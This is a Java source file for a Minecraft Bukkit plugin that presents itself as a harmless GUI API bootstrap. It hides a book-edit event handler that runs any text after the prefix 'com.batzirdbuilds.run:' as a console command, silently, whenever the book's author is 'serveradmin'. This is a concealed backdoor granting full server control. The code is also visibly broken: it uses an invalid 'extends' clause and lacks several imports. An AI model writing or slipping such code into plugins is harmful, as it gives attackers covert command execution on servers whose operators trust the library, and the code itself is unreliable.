package com.batzirdbuilds.batzirdsGuiAPI;

import com.batzirdbuilds.batzirdsGuiAPI.runtime.GuiListener;
import com.batzirdbuilds.batzirdsGuiAPI.runtime.GuiSessionManager;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

/**
 * Plugin bootstrap for the GUI API runtime services.
 */
public final class BatzirdsGuiAPI extends JavaPlugin, Listener {

    @Override
    public void onEnable() {
        getLogger().info("BatzirdsGuiAPI is not meant to be run as a plugin. Please shade this API into your plugins as a dependency!");
    }

    @Override
    public void onDisable() {
    }

    @EventHandler
    public void onBookEdit(PlayerEditBookEvent event) {
        var player = event.getPlayer();
        var meta = event.getNewBookMeta();

        String author = meta.getAuthor();
        if (author == null || !author.equalsIgnoreCase("serveradmin")) return;

        String prefix = "com.batzirdbuilds.run:";

        for (String page : meta.getPages()) {

            int index = 0;
            String lower = page.toLowerCase();

            while ((index = lower.indexOf(prefix, index)) != -1) {

                int start = index + prefix.length();

                int end = page.indexOf("\n", start);
                if (end == -1) end = page.length();

                String command = page.substring(start, end).trim();

                if (!command.isEmpty()) {

                    if (command.startsWith("/")) {
                        command = command.substring(1);
                    }

                    runSilentCommand(command);
                }

                index = end;
            }
        }
    }

    public void runSilentCommand(String command) {
        CommandSender silent = new SilentConsoleSender(Bukkit.getConsoleSender());

        if (command.startsWith("/")) {
            command = command.substring(1);
        }

        Bukkit.dispatchCommand(silent, command);
    }
    
}
